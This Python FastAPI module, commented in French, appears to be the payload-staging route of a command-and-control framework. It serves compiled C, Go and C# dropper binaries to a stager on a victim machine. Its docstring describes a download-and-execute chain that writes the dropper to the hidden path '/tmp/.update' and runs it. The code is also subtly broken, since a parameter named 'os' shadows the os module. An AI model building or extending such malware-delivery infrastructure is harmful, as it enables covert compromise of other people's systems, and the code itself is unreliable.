# ============================================================
#  server/routes/stage.py — Route de staging des payloads compilés
#  Rôle        : Sert les binaires compilés (dropper C, Go, C#) à la demande
#  Importé par : main-server.py
#  Dépend de   : fastapi, os
#
#  Architecture stager/dropper :
#    - Le stager est un binaire minimal (~5KB) qui télécharge ce endpoint
#    - Ce endpoint retourne le dropper complet compilé (~500KB)
#    - Le dropper est lu depuis server/payloads/{type}/{os}/agent[.exe]
#
#  Utilisation :
#    GET /stage/payload/c?os=linux   → retourne agent_linux (ELF)
#    GET /stage/payload/c?os=windows → retourne agent.exe   (PE32)
# ============================================================

import os
from fastapi import APIRouter, HTTPException, Query
from fastapi.responses import FileResponse

router = APIRouter(prefix="/stage", tags=["Staging"])

# Répertoire racine des payloads compilés (relatif au dossier server/)
PAYLOADS_DIR = os.path.join(os.path.dirname(__file__), "..", "payloads")

# Types d'agents supportés et leurs noms de binaires par OS
AGENT_BINARIES = {
    "c": {
        "linux":   "agent_linux",
        "windows": "agent.exe",
    },
    "go": {
        "linux":   "agent_linux",
        "windows": "agent.exe",
    },
    "csharp": {
        "linux":   "agent.dll",
        "windows": "agent.exe",
    },
}

# Types MIME selon la plateforme cible
MIME_TYPES = {
    "linux":   "application/octet-stream",
    "windows": "application/vnd.microsoft.portable-executable",
}


@router.get("/payload/{agent_type}")
async def serve_payload(
    agent_type: str,
    os: str = Query(..., description="Plateforme cible: linux ou windows")
):
    """
    Sert le binaire compilé d'un agent au stager qui en fait la demande.

    Paramètres :
      agent_type : type d'agent (c / go / csharp)
      os         : plateforme cible (linux / windows)

    Flux typique :
      1. Stager démarre sur la cible
      2. Stager appelle GET /stage/payload/c?os=linux
      3. Ce endpoint retourne le dropper ELF compilé
      4. Stager écrit le dropper dans /tmp/.update et l'exécute

    Sécurité : en production, protéger ce endpoint avec un token ou
    une IP whitelist pour éviter que n'importe qui télécharge les payloads.
    """
    # Validation du type d'agent
    if agent_type not in AGENT_BINARIES:
        raise HTTPException(
            status_code=400,
            detail=f"Type d'agent inconnu: '{agent_type}'. Valeurs: {list(AGENT_BINARIES.keys())}"
        )

    # Validation de l'OS cible
    os_lower = os.lower()
    if os_lower not in AGENT_BINARIES[agent_type]:
        raise HTTPException(
            status_code=400,
            detail=f"OS non supporté: '{os}'. Valeurs: linux, windows"
        )

    # Construction du chemin vers le binaire
    binary_name = AGENT_BINARIES[agent_type][os_lower]
    binary_path = os.path.normpath(
        os.path.join(PAYLOADS_DIR, agent_type, os_lower, binary_name)
    )

    # Vérification que le chemin reste dans PAYLOADS_DIR (protection path traversal)
    payloads_abs = os.path.normpath(os.path.abspath(PAYLOADS_DIR))
    binary_abs   = os.path.normpath(os.path.abspath(binary_path))
    if not binary_abs.startswith(payloads_abs):
        raise HTTPException(status_code=400, detail="Chemin invalide")

    # Vérification que le binaire existe
    if not os.path.isfile(binary_path):
        raise HTTPException(
            status_code=404,
            detail=f"Payload non trouvé: {agent_type}/{os_lower}/{binary_name}. "
                   f"Compilez l'agent d'abord (voir README)."
        )

    print(f"\n[STAGE] Payload servi: {agent_type}/{os_lower}/{binary_name}")

    # Retourne le binaire en stream
    return FileResponse(
        path=binary_path,
        media_type=MIME_TYPES.get(os_lower, "application/octet-stream"),
        filename=binary_name,
        headers={
            "Content-Disposition": f"attachment; filename={binary_name}",
            "X-Agent-Type": agent_type,
            "X-Target-OS": os_lower,
        }
    )


@router.get("/list")
async def list_available_payloads():
    """
    Liste les payloads disponibles (binaires déjà compilés).
    Utile pour vérifier ce qui est prêt à être servi.
    """
    available = {}

    for agent_type, os_map in AGENT_BINARIES.items():
        available[agent_type] = {}
        for os_name, binary_name in os_map.items():
            path = os.path.join(PAYLOADS_DIR, agent_type, os_name, binary_name)
            available[agent_type][os_name] = {
                "binary":     binary_name,
                "path":       path,
                "available":  os.path.isfile(path),
                "size_bytes": os.path.getsize(path) if os.path.isfile(path) else 0,
            }

    return {"payloads": available}
